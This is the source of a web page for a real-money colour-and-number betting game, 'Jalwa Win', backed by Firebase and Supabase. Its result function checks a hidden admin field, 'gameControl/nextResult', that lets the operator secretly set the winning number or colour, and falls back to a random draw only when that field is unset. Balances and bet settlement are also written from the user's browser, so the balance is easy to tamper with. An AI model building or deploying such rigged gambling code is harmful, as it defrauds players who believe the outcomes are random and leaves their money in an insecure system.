<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Jalwa Win - Pro Dark</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root { 
            --green: #1DB954; --violet: #9c27b0; --red: #ff4757; 
            --blue: #007AFF; --bg-dark: #0a0e1a; --card-bg: #161d2b;
            --text-dim: #a4b0be;
        }
        body { 
            margin: 0; font-family: 'Poppins', sans-serif; 
            background: var(--bg-dark); color: white; user-select: none; padding-bottom: 20px; 
            overflow-x: hidden;
        }

        .nav { 
            background: #161d2b; color: #00ffca; padding: 15px; 
            display: flex; justify-content: space-between; align-items: center;
            font-weight: bold; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #1f2855;
        }
        .bal-display { background: rgba(0,255,202,0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #00ffca; color: #00ffca; }

        .card { 
            background: var(--card-bg); margin: 15px; padding: 20px; border-radius: 15px; 
            display: flex; justify-content: space-between; align-items: center; 
            position: relative; border: 1px solid #1f2855;
        }
        .timer { font-size: 32px; font-weight: 800; color: white; font-family: 'Courier New', monospace; }
        
        #lockOverlay { 
            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(10,14,26,0.9); z-index: 2000; justify-content: center; 
            align-items: center; border-radius: 15px; font-weight: bold; color: var(--red); 
            font-size: 14px; letter-spacing: 2px; 
        }

        .btn-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; padding: 10px 15px; }
        .btn-join { border: none; padding: 15px; color: white; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 13px; }
        .c-Red { background: var(--red); } .c-Green { background: var(--green); } .c-Violet { background: var(--violet); } 

        .num-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; padding: 15px; }
        .num-btn { width: 45px; height: 45px; background: #1f2855; border: none; font-size: 18px; font-weight: bold; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; margin: auto; }

        .h-grid { display: grid; grid-template-columns: repeat(10, 1fr); gap: 18px 2px; padding: 20px 10px; background: var(--card-bg); margin: 0 15px; border-radius: 15px; }
        .dot { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 10px; position: relative; margin: 0 auto; }
        .Mix { background: linear-gradient(135deg, var(--red) 50%, var(--violet) 50%); }
        .MixG { background: linear-gradient(135deg, var(--green) 50%, var(--violet) 50%); }

        .order-table { width: 100%; border-collapse: collapse; background: var(--card-bg); font-size: 13px; border-radius: 15px; margin-top: 5px; color: white; text-align: center; }
        .order-table td { padding: 12px 5px; border-bottom: 1px solid #1f2855; }

        #betModal { display: none; position: fixed; bottom: 0; width: 100%; background: #161d2b; z-index: 3000; border-radius: 30px 30px 0 0; padding: 30px; box-sizing: border-box;}
        #ticketOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 5000; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
        .ticket { background: #161d2b; width: 85%; max-width: 320px; border-radius: 30px; text-align: center; border: 2px solid #1f2855; padding: 20px; }
        .res-ball { width: 70px; height: 70px; border-radius: 50%; margin: 15px auto; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: 900; }
    </style>
</head>
<body>

<div class="nav"><span>JALWA WIN PRO</span><div class="bal-display">â‚¹<span id="balDisplay">0.00</span></div></div>

<div class="card">
    <div><div style="color:var(--text-dim); font-size:11px;">Period</div><div id="pIdDisplay" style="font-weight:bold; font-size:18px; color:#00ffca;">...</div></div>
    <div class="timer" id="timerDisplay">00:00</div>
    <div id="lockOverlay">CALCULATION...</div>
</div>

<div class="btn-row">
    <button class="btn-join c-Green" onclick="openBet('Green')">Green</button>
    <button class="btn-join c-Violet" onclick="openBet('Violet')">Violet</button>
    <button class="btn-join c-Red" onclick="openBet('Red')">Red</button>
</div>

<div class="num-grid" id="numberGrid"></div>

<div style="padding: 15px; font-size: 12px; color: var(--text-dim);">HISTORY RECORDS</div>
<div id="historyGrid" class="h-grid"></div>

<div style="padding: 15px; font-size: 12px; color: var(--text-dim);">MY BETS</div>
<div style="padding: 0 15px;"><table class="order-table"><tbody id="orderBody"></tbody></table></div>

<div id="betModal">
    <div id="betHead" style="padding:10px; color:white; font-weight:bold; text-align:center; border-radius:10px;">Join</div>
    <div style="text-align:center; margin-top:20px;">
        <button class="btn-join" onclick="confirmBet()" style="background:var(--blue); width:100%;">CONFIRM BET</button>
        <button class="btn-join" onclick="document.getElementById('betModal').style.display='none'" style="background:transparent; color:gray; width:100%; margin-top:10px;">CANCEL</button>
    </div>
</div>

<div id="ticketOverlay">
    <div class="ticket">
        <h2 id="tHead">RESULT</h2>
        <div id="tBall" class="res-ball">?</div>
        <h1 id="tWinAmt">â‚¹0.00</h1>
        <button class="btn-join" onclick="document.getElementById('ticketOverlay').style.display='none'" style="background:white; color:black; width:100%; border-radius:50px;">CLOSE</button>
    </div>
</div>

<script>
    // --- CONFIG ---
    const firebaseConfig = { databaseURL: "https://jalwav7-default-rtdb.firebaseio.com" };
    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const supabaseClient = supabase.createClient("https://orksbkahfantwdbwzrye.supabase.co", "sb_publishable_F7ErxCXZz7Zpcpd2-yH-Bg_qDFL8tUI");

    const userId = localStorage.getItem('jalwa_user_phone') || 'Guest';
    let userBalance = 0, currentP = "", selectedType = "", isLocked = false, lastProcessedPid = "";
    let myBets = JSON.parse(localStorage.getItem('my_jalwa_bets') || "[]");

    // Number Grid Initializer
    const grid = document.getElementById('numberGrid');
    [0,1,2,3,4,5,6,7,8,9].forEach(n => {
        let col = (n==0||n==5)?'#9c27b0':(n%2==0?'#ff4757':'#1DB954');
        grid.innerHTML += `<button class="num-btn" style="border:2px solid ${col}" onclick="openBet(${n})">${n}</button>`;
    });

    // Balance Listener
    db.ref('users/' + userId).on('value', snap => {
        if(snap.exists()){ userBalance = snap.val().balance || 0; document.getElementById('balDisplay').innerText = userBalance.toFixed(2); }
    });

    function openBet(t) { 
        if(isLocked) return; 
        selectedType = t; 
        document.getElementById('betModal').style.display='block'; 
        document.getElementById('betHead').innerText = "Join " + t;
    }

    async function confirmBet() {
        let amt = 10; // Simple 10rs bet for demo
        if(userBalance < amt) return alert("Low Balance");
        await db.ref('users/' + userId).update({ balance: userBalance - amt });
        let bet = { pid: currentP, sel: selectedType, amt: amt, status: 'Wait', win: 0 };
        myBets.push(bet);
        localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
        db.ref('bets/' + currentP).push({ ...bet, uid: userId });
        document.getElementById('betModal').style.display = 'none';
        updateOrderTable();
    }

    // --- ðŸš¨ THE REAL CONNECTION ENGINE ---
    async function processResult(pid) {
        if(!pid || lastProcessedPid === pid) return;
        lastProcessedPid = pid;

        // 1. Check Admin Command
        const adminSnap = await db.ref('gameControl/nextResult').once('value');
        let adminRes = adminSnap.exists() ? adminSnap.val() : "none";
        
        let n, col;
        if(adminRes !== "none") {
            if(typeof adminRes === 'number') n = adminRes;
            else {
                if(adminRes === 'Green') n = 1; else if(adminRes === 'Red') n = 2; else n = 5;
            }
            db.ref('gameControl/nextResult').set("none"); // Reset Admin
        } else {
            // Default Random
            n = Math.floor(Math.random() * 10);
        }

        col = (n==0||n==5)?(n==0?'Red':'Green'):(n%2==0?'Red':'Green');
        await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
        
        // Settle Bets
        let winSum = 0, hit = false;
        myBets.forEach(b => {
            if(b.pid === pid && b.status === 'Wait') {
                hit = true;
                let win = false;
                if(b.sel == n) win = true;
                else if(b.sel == 'Green' && (n%2!=0 || n==5)) win = true;
                else if(b.sel == 'Red' && (n%2==0 || n==0)) win = true;
                
                if(win) { b.status = 'Win'; b.win = b.amt * 1.9; winSum += b.win; }
                else b.status = 'Loss';
            }
        });

        if(hit) {
            localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
            if(winSum > 0) db.ref('users/'+userId).update({ balance: userBalance + winSum });
            showTicket(n, col, winSum);
            updateOrderTable();
        }
        fetchHistory();
    }

    function showTicket(n, c, w) {
        document.getElementById('ticketOverlay').style.display='flex';
        document.getElementById('tBall').innerText = n;
        document.getElementById('tBall').className = "res-ball " + (n==0?'Mix':(n==5?'MixG':'c-'+c));
        document.getElementById('tWinAmt').innerText = "â‚¹" + w.toFixed(2);
        document.getElementById('tWinAmt').style.color = w>0?'#1DB954':'#ff4757';
    }

    function updateOrderTable() {
        let rows = "";
        [...myBets].reverse().slice(0,5).forEach(b => {
            rows += `<tr><td>${b.pid}</td><td>${b.sel}</td><td>â‚¹${b.amt}</td><td style="color:${b.status=='Win'?'#1DB954':'#ff4757'}">${b.status}</td></tr>`;
        });
        document.getElementById('orderBody').innerHTML = rows || "<tr><td colspan='4'>No Bets</td></tr>";
    }

    async function fetchHistory() {
        const { data } = await supabaseClient.from('game_history').select('*').order('id', {ascending:false}).limit(10);
        if(data) document.getElementById('historyGrid').innerHTML = data.map(r => `<div class="dot ${r.num==0?'Mix':(r.num==5?'MixG':'c-'+r.col)}">${r.num}</div>`).join('');
    }

    function sync() {
        const now = new Date();
        const rem = 30 - (now.getSeconds() % 30);
        isLocked = rem <= 5;
        document.getElementById('lockOverlay').style.display = isLocked ? 'flex' : 'none';
        document.getElementById('timerDisplay').innerText = `00:${rem.toString().padStart(2,'0')}`;
        
        let pId = now.getFullYear().toString() + (now.getMonth()+1) + now.getDate() + Math.floor(((now.getHours()*3600)+(now.getMinutes()*60)+now.getSeconds())/30);
        document.getElementById('pIdDisplay').innerText = pId;
        if(currentP !== pId) { let old = currentP; currentP = pId; if(old) processResult(old); }
    }

    setInterval(sync, 1000);
    window.onload = () => { fetchHistory(); updateOrderTable(); };
</script>
</body>
</html>
